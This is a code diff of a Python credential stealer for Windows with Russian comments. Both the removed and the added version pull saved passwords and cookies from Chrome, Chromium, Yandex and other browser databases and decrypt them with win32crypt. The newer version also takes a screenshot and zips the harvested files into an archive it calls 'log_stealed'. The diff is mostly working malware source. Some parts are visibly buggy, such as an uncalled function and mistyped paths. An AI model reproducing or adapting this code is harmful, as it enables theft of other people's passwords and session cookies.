@@ -1,226 +1,143 @@
 import os
-#from Crypto.Hash import SHA512
-#from win32 import *
-import sqlite3
+import win32crypt
 import shutil
-#import requests
+import sqlite3
 import zipfile
-import getpass
-#import platform
-#import tempfile
-#import smtplib
-#import time
-#from csv import cv2 
-import sys
-from base64 import encodebytes
-import random
 
-################################################################################
-#                              GOOGLE PASSWORDS                                #
-################################################################################
-def Chrome(): 
-   text = 'Passwords Chrome:' + '\n' 
-   text += 'URL | LOGIN | PASSWORD' + '\n' 
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'): 
-      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
-      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2') 
-      cursor = conn.cursor()
-      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-      for result in cursor.fetchall():
-      	password = win32crypt.CryptUnprotectData(result[2])[1].decode() 
-      login = result[1]
-      url = result[0]
-      if password != '':
-            text += url + ' | ' + login + ' | ' + password + '\n' 
-   return text
-file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")
+from PIL import ImageGrab
+
+
+username = os.getlogin()
+
+
+def Chrome():
+    text = "\nPasswords Chrome: " + "\n"
+    text += 'URL | LOGIN | PASSWORD:' + '\n'  # Логи идут в таком формате.
+    if os.path.exists(
+            os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'):  # Ищем файлы Login Data
+        shutil.copy2(os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data',
+                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
+        conndb = sqlite3.connect(os.getenv(
+            "LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data')  # Начинаем работать с sqlite базой
+        cursor = conndb.cursor()
+        cursor.execute(
+            'SELECT action_url, username_value, password_value FROM logins')  # Вытаскиваем Ссылку, логин, пароль
+        for results in cursor.fetchall():
+            password = win32crypt.CryptUnprotectData(results[2])[1].decode()  # Расшифровываем данные
+            login = results[1]
+            url = results[0]
+            if password != '':
+                text += url + ' | ' + login + ' | ' + password + '\n'  # Добавляем данный в переменную
+    return text
+
+
+file = open(os.getenv("APPDATA") + '\\google_pass.txt', "w+")  # Сохраняем данные в txt файл google_pass
 file.write(str(Chrome()) + '\n')
 file.close()
-################################################################################
-#                              GOOGLE Cookies                                  #
-################################################################################
+
+
 def Chrome_cockie():
-   textc = 'Cookies Chrome:' + '\n'
-   textc += 'URL | COOKIE | COOKIE NAME' + '\n'
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
-      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
-      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
-      cursor = conn.cursor()
-      cursor.execute("SELECT * from cookies")
-      for result in cursor.fetchall():
-         cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
-         name = result[2]
-         url = result[1]
-         textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
-   return textc
-file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+") 
-file.write(str(Chrome_cockie()) + '\n')
+    textc = "\nCockies Chrome: " + "\n"
+    textc += 'URL | COOKIE | COOKIE NAME' + '\n'
+    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
+        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies',
+                     os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
+        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
+        cursor = conn.cursor()
+        cursor.execute("SELECT * from cookies")
+        for result in cursor.fetchall():
+            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
+            name = result[2]
+            url = result[1]
+            textc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
+    return textc
+
+
+file = open(os.getenv("APPDATA") + '\\google_cookies.txt', "w+")
+file.write(str(Chrome_cockie) + '\n')
 file.close()
-################################################################################
-#                              FIREFOX Cookies                                 #
-################################################################################
-def Firefox():
-   textf = ''
-   textf +='Firefox Cookies:' + '\n'
-   textf += 'URL | COOKIE | COOKIE NAME' + '\n'
-   for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
-      for name in dirs:
-      	conn = sqlite3.connect(os.path.join(root, name)+'\\cookies.sqlite')
-      cursor = conn.cursor()
-      cursor.execute("SELECT baseDomain, value, name FROM moz_cookies")
-      data = cursor.fetchall()
-      for i in range(len(data)):
-	      url, cookie, name = data[i]
-      textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'     
-      break
-   return textf
-file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")
-file.write(str(Firefox()) + '\n')
+
+
+def Yandex():
+    texty = '\nYANDEX Cookies:' + '\n'
+    texty += 'URL | COOKIE | COOKIE NAME' + '\n'
+    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies'):
+        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies',
+                     os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
+        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies2')
+        cursor = conn.cursor()
+        cursor.execute("SELECT * from cookies")
+        for result in cursor.fetchall():
+            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
+            name = result[2]
+            url = result[1]
+            texty += url + ' | ' + str(cookie) + ' | ' + name + '\n'
+    return texty
+
+
+file = open(os.getenv("APPDATA") + '\\yandex_cookies.txt', "w+")  # данные
+file.write(str(Yandex()) + '\n')
 file.close()
-################################################################################
-#                              CHROMIUM PASSWORDS                              #
-################################################################################
+
+
 def chromium():
-   textch ='Chromium Passwords:' + '\n'
-   textch += 'URL | LOGIN | PASSWORD' + '\n'
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
-      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
-      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
-      cursor = conn.cursor()
-      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-      for result in cursor.fetchall():
-         password = win32crypt.CryptUnprotectData(result[2])[1].decode()
-         login = result[1]
-         url = result[0]
-         if password != '':
-               textch += url + ' | ' + login + ' | ' + password + '\n'
-               return textch
-file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")
+    textch = '\nChromium Passwords:' + '\n'
+    textch += 'URL | LOGIN | PASSWORD' + '\n'
+    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default'):
+        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data',
+                     os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
+        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Login Data2')
+        cursor = conn.cursor()
+        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+        for result in cursor.fetchall():
+            password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+            login = result[1]
+            url = result[0]
+            if password != '':
+                textch += url + ' | ' + login + ' | ' + password + '\n'
+    return textch
+
+
+file = open(os.getenv("APPDATA") + '\\chromium.txt', "w+")  # данные
 file.write(str(chromium()) + '\n')
 file.close()
-################################################################################
-#                              CHROMIUM cookies                                #
-################################################################################
+
+
 def chromiumc():
-   textchc = '' 
-   textchc +='Chromium Cookies:' + '\n'
-   textchc += 'URL | COOKIE | COOKIE NAME' + '\n'
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies'):
-      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
-      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
-      cursor = conn.cursor()
-      cursor.execute("SELECT * from cookies")
-      for result in cursor.fetchall():
-         cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
-         name = result[2]
-         url = result[1]
-         textchc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
-   return textchc
-file = open(os.getenv("APPDATA") + '\\chromium_cookies.txt', "w+")
+    textchc = ""
+    textchc += '\nChromium Cookies:' + '\n'
+    textchc += 'URL | COOKIE | COOKIE NAME' + '\n'
+    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies'):
+        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies',
+                     os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
+        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Chromium\\User Data\\Default\\Cookies2')
+        cursor = conn.cursor()
+        cursor.execute("SELECT * from cookies")
+        for result in cursor.fetchall():
+            cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
+            name = result[2]
+            url = result[1]
+            textchc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
+    return textchc
+
+
+file = open(os.getenv("APPDATA") + '\\chromium_cookies.txt', "w+")  # данные
 file.write(str(chromiumc()) + '\n')
 file.close()
-################################################################################
-#                              OPERA PASSWORDS                                 #
-################################################################################
-def Opera():
-   texto = 'Passwords Opera:' + '\n'
-   texto += 'URL | LOGIN | PASSWORD' + '\n'
-   if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
-      shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
-      conn = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data2')
-      cursor = conn.cursor()
-      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-      for result in cursor.fetchall():
-         password = win32crypt.CryptUnprotectData(result[2])[1].decode()
-         login = result[1]
-         url = result[0]
-         if password != '':
-            texto += url + ' | ' + login + ' | ' + password + '\n'
-file = open(os.getenv("APPDATA") + '\\opera_pass.txt', "w+")
-file.write(str(Opera()) + '\n')
-file.close()
-################################################################################
-#                              FIREFOX PASSWORDS                               #
-################################################################################
-def Firefox_cookies():
-   texto = 'Passwords firefox:' + '\n'
-   texto += 'URL | LOGIN | PASSWORD' + '\n'
-   if os.path.exists(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox'):
-      shutil.copy2(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2', os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
-      conn = sqlite3.connect(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
-      cursor = conn.cursor()
-      cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-      for result in cursor.fetchall():
-         password = win32crypt.CryptUnprotectData(result[2])[1].decode()
-      login = result[1]
-   url = result[0]
-   if password != '':
-      texto += url + ' | ' + login + ' | ' + password + '\n'
-file = open(os.getenv("APPDATA") + '\\firefox_pass.txt', "w+")
-file.write(str(Firefox_cookies()) + '\n')
-file.close()
-################################################################################
-#                              YANDEX PASSWORDS                                #
-################################################################################
-def Yandexpass():
-   textyp = 'Passwords Yandex:' + '\n'
-   textyp += 'URL | LOGIN | PASSWORD' + '\n'
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db'):
-   	shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data.db', os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
-   	conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Yandexe\\YandexBrowser\\User Data\\Default\\Ya Login Data2.db')
-   cursor = conn.cursor()
-   cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-   for result in cursor.fetchall():
-      password = win32crypt.CryptUnprotectData(result[2])[1].decode()
-      login = result[1]
-      url = result[0]
-   if password != '':
-      textyp += url + ' | ' + login + ' | ' + password + '\n'
-   return textyp
-file = open(os.getenv("APPDATA") + '\\yandex_passwords.txt', "w+")
-file.write(str(Yandexpass()) + '\n')
-file.close()
-################################################################################
-#                             OPERA cookies                                    #
-################################################################################
-def Opera_c():
-   textoc ='Cookies Opera:' + '\n'
-   textoc += 'URL | COOKIE | COOKIE NAME' + '\n'
-   if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
-      shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
-      conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
-      cursor = conn.cursor()
-      cursor.execute("SELECT * from cookies")
-      for result in cursor.fetchall():
-         cookie = win32crypt.CryptUnprotectData(result[12])[1].decode()
-         name = result[2]
-         url = result[1]
-         textoc += url + ' | ' + str(cookie) + ' | ' + name + '\n'
-   return textoc
-file = open(os.getenv("APPDATA") + '\\opera_cookies.txt', "w+")
-file.write(str(Opera_c()) + '\n')
-file.close()
-################################################################################
-#                              PACKING TO ZIP                                  #
-################################################################################
-zname = r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
-NZ = zipfile.ZipFile(zname,'w')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_pass.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\firefox_cookies.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\yandex_passwords.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\alldata.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_pass.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\google_cookies.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\chromium_cookies.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\amigo_pass.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\amigo_cookies.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_pass.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\opera_cookies.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\filezilla.txt')
-NZ.write(r'C:\\Users\\' + getpass.getuser() + '\\AppData\\Roaming\\sreenshot.jpg')
-NZ.close() 
-################################################################################
-#                              DOC-НАШ ZIP                                     #
-################################################################################
-doc = 'C:\\Users\\' + getpass.getuser() + '\\AppData\\Local\\Temp\\LOG.zip'
+
+
+screen = ImageGrab.grab()
+screen.save(os.getenv("APPDATA") + '\\sreenshot.jpeg')
+
+
+zname = r'E:\LOG.zip'  # создаем переменную - название и местоположение файла
+newzip = zipfile.ZipFile(zname, 'w')  # создаем архив
+newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_pass.txt')
+newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\google_cookies.txt')
+newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\yandex_cookies.txt')
+newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium.txt')
+newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\chromium_cookies.txt')
+newzip.write(r'C:\\Users\\' + username + '\\AppData\\Roaming\\sreenshot.jpeg')
+newzip.close()  # закрываем архив
+
+log_stealed = open("E:\LOG.zip", 'rb')
